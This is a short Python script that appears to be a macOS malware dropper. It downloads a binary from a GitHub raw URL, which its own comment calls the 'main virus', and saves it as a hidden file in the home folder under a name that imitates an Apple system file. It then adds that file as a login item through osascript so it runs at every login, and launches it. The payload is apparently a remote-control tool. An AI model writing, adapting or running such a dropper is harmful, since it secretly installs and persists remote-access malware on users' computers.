from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system as cmd

filename = "com.apple.com.user.core"

# download main virus
open(f"{expanduser('~')}/.{filename}", 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)

cmd(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")

subproc([f"{expanduser('~')}/.{filename}"])
